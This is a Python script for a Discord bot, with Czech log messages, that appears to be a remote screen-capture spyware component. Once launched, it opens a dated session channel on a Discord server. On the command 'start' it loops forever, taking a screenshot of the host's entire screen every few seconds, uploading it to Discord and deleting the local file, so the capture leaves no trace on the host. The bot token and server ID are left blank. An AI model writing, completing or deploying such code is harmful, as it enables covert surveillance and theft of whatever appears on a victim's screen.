import discord
from PIL import ImageGrab
from datetime import datetime
import os
import time
import asyncio
import tempfile
import pathlib

TOKEN = ""
GUILD_ID = 

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

created_channel = None

async def send_message(message=None, file=None):
    if created_channel is None:
        print("[ERROR] Kanal jeste nebyl vytvoren.")
        return

    await created_channel.send(content=message, file=file)

@client.event
async def on_ready():
    global created_channel
    print(f"[READY] Přihlášen jako {client.user} (ID: {client.user.id})")

    guild = client.get_guild(GUILD_ID)

    if guild is None:
        print(f"[CHYBA] Server s ID {GUILD_ID} nebyl nalezen.")
        return

    print(f"[INFO] Server nalezen: {guild.name} (ID: {guild.id})")

    now = datetime.now()
    channel_name = now.strftime("session-%d-%m-%Y")

    try:
        channel = await guild.create_text_channel(channel_name)
        print(f"[INFO] Kanál vytvořen: #{channel.name} (ID: {channel.id})")
        created_channel = channel
    except discord.Forbidden:
        print("[CHYBA] Bot nemá oprávnění vytvořit kanál.")
        return
    except discord.HTTPException as e:
        print(f"[CHYBA] Vytvoření kanálu selhalo: {e}")
        return

    try:
        await channel.send(
            f"🟢 **Bot ready**\n"
            f"📅 date: {now.strftime('%d.%m.%Y')}\n"
            f"🕒 time: {now.strftime('%H:%M:%S')}"
        )
        print(f"[INFO] Úvodní zpráva odeslána do #{channel.name}")
    except discord.HTTPException as e:
        print(f"[CHYBA] Odeslání zprávy selhalo: {e}")


@client.event
async def on_error(event, *args, **kwargs):
    print(f"[CHYBA] Výjimka v eventu '{event}'")
    import traceback
    traceback.print_exc()

async def screen():
    temp_file_dir = tempfile.gettempdir()

    screenshot_path = pathlib.Path(
        f"{temp_file_dir}/screenshot.png"
    )

    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)

    await send_message(
        file=discord.File(screenshot_path, filename="screenshot.png")
    )

    os.remove(screenshot_path)

    await asyncio.sleep(1)

@client.event
async def on_message(message):
    if message.author.bot:
        return

    if created_channel is None:
        return

    if message.channel.id != created_channel.id:
        return
    
    match message.content.lower().strip():
            case "start":
                await send_message("START prijat")
                while True:
                    await screen()
                    await asyncio.sleep(2)
            

client.run(TOKEN)